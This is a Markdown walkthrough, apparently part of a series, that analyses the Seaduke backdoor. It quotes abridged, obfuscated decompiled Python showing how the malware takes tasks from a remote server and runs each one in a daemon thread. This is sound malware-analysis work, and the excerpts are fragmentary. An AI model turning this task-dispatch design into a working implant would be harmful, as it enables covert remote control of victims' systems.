# putting tasks on `threadStuffKlass`
after the bot [fetches instructions](https://github.com/mynameisvinn/Seaduke/blob/master/fetch.md) from a remote server and [decodes it](https://github.com/mynameisvinn/Seaduke/blob/master/decode.md), the bot executes instructions by placing tasks on `threadStuffKlass`. 

```python
def seh_wrapper():  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L2251
    ...
    try:
        main()
    except KeyboardInterrupt as ki:
        sys_exit(0)


def main():  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L2183
    ...
    while 1:
        ...
        networkTasks = networkHandleKlass.get_tasks()  # returns a list of dict
        ...
        if networkTasks:
            for networkTask in networkTasks:
                taskID = networkTask.get('task_id', None)
                taskData=networkTask.get('task_data', None)
                if taskID and taskData:
                    if not threadStuffKlass.have_task(taskID):
                        try:
                            threadStuffKlass.put(taskID,taskData)  # this is the money shot
                            botKlass.reset_tick_count()
    ...
```
## so, what is `threadStuffKlass`?
`threadstuffKlass` is an instance of `DoingThreadStuffKlass` created by `main()`:
```python
def main():
    threadStuffKlass=DoingThreadStuffKlass()  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L2184
```
lets look at `DoingThreadStuffKlass`:
```python
class DoingThreadStuffKlass(object):

    def __init__(self):
        self.threads={}

    def put(self,taskID,taskData):
        foo = ttt(taskID, taskData, on_complete=self.on_thread_complete)
        foo.daemon=True
        self.threads[taskID] = foo
        foo.start()


class ttt(threading_thread):

    def __init__(self,taskID,taskData,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
        self.task_id=taskID
        self.task_data=taskData
        self.on_complete=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('on_complete',None)
        self.network_handler=NetworkHandlerKlass()
        threading_thread.__init__(self)
        self.processor=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDeQ()
```
so there we have it, seaduke fetches instructions from a remote server and does something on host with multithreading.